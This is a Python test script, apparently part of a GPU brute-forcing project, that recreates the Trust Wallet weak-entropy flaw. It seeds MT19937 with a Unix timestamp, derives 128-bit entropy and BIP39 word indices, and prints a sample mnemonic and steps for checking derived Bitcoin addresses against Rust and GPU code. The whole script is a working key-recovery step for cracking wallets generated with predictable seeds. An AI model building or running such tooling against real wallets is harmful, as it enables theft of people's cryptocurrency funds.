#!/usr/bin/env python3
"""
Quick CPU validation using standard libraries
Tests MT19937 entropy generation and mnemonic derivation
"""

import hashlib

def mt19937_test():
    """Test MT19937 matches Rust implementation"""
    import random
    
    # Test seed from Trust Wallet vulnerability
    seed = 1668384000
    rng = random.Random(seed)
    
    # Generate 128-bit entropy (4x u32 little-endian)
    entropy = bytearray(16)
    for i in range(4):
        rand_u32 = rng.getrandbits(32)
        entropy[i*4:(i+1)*4] = rand_u32.to_bytes(4, 'little')
    
    entropy_hex = entropy.hex()
    print(f"Seed: {seed}")
    print(f"Entropy (hex): {entropy_hex}")
    
    # Compute checksum
    entropy_hash = hashlib.sha256(entropy).digest()
    checksum = (entropy_hash[0] >> 4) & 0x0F
    
    # Extract 11-bit indices
    entropy_bits = int.from_bytes(entropy, 'big')
    indices = []
    for i in range(11):
        bit_pos = 128 - (i + 1) * 11
        index = (entropy_bits >> bit_pos) & 0x7FF
        indices.append(index)
    
    # Last index includes checksum
    bit_pos = 128 - 12 * 11
    last_7_bits = (entropy_bits >> bit_pos) & 0x7F
    indices.append((last_7_bits << 4) | checksum)
    
    print(f"Word indices: {indices}")
    print(f"\nExpected mnemonic: spider history orbit robust used holiday patrol ice fruit cube alpha scan")
    print(f"\nTo verify, check if indices match BIP39 wordlist positions")
    print(f"  indices[0]={indices[0]} should be 'spider'")
    print(f"  indices[1]={indices[1]} should be 'history'")
    
    return entropy_hex

if __name__ == '__main__':
    entropy = mt19937_test()
    
    print("\n" + "="*80)
    print("CROSS-CHECK INSTRUCTIONS:")
    print("="*80)
    print("1. This Python code generated entropy from seed 1668384000")
    print(f"   Entropy: {entropy}")
    print("\n2. Check Rust test in trust_wallet.rs (test_timestamp_seeding)")
    print("   Should produce same mnemonic")
    print("\n3. To validate GPU:")
    print("   - GPU should derive addresses from this same entropy")
    print("   - Compare GPU address output with online BIP44 derivation tool")
    print("   - Input mnemonic: 'spider history orbit robust used holiday patrol ice fruit cube alpha scan'")
    print("   - Derivation path: m/44'/0'/0'/0/0")
    print("   - Should get Legacy (P2PKH) address starting with '1'")
